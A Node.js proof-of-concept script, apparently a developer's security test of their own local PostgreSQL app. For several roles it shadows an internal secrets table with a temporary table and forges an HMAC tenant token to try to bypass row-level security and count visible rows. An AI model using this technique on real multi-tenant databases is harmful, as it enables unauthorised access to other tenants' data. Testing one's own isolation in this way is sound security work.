const { Pool } = require('pg');
const pool = new Pool({ user: 'u0_a338', host: '127.0.0.1', database: 'postgres', port: 5432 });

async function attackRole(role) {
    const client = await pool.connect();
    try {
        await client.query(`SET ROLE ${role}`);
        await client.query("CREATE TEMP TABLE _internal_secrets (key TEXT PRIMARY KEY, value TEXT NOT NULL)");
        await client.query("INSERT INTO _internal_secrets VALUES ('tenant_mac_key', 'attacker_secret')");
        
        const crypto = require('crypto');
        const sig = crypto.createHmac('sha256', 'attacker_secret').update('00000000-0000-0000-0000-000000000001').digest('hex');
        
        await client.query(`SET app.tenant_token = '00000000-0000-0000-0000-000000000001.${sig}'`);
        const res = await client.query("SELECT count(*) FROM requests");
        console.log(`${role} bypassed RLS! Rows visible:`, res.rows[0].count);
    } catch(e) {
        console.log(`${role} failed:`, e.message);
    } finally {
        client.release();
    }
}

async function run() {
    await attackRole('gateway_role');
    await attackRole('worker_role');
    await attackRole('policy_role');
    await attackRole('gc_role');
    pool.end();
}
run();
